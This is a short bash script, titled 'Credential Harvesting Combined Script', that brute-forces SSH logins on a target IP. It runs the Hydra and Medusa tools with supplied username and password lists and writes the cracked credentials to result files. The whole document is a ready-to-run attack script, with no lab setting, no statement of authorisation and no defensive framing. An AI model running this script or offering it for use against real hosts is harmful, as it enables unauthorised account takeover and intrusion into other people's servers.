#!/bin/bash
# Credential Harvesting Combined Script
# Uses Hydra and Medusa for brute-forcing credentials.

TARGET=$1
USERLIST=$2
PASSLIST=$3

if [ -z "$TARGET" ] || [ -z "$USERLIST" ] || [ -z "$PASSLIST" ]; then
  echo "Usage: $0 <target_ip> <user_list> <password_list>"
  exit 1
fi

echo "Running Hydra for SSH brute-force..."
hydra -L $USERLIST -P $PASSLIST $TARGET ssh -o hydra_results.txt

echo "Running Medusa for SSH brute-force..."
medusa -h $TARGET -U $USERLIST -P $PASSLIST -M ssh -o medusa_results.txt

echo "Combined results saved to hydra_results.txt and medusa_results.txt"
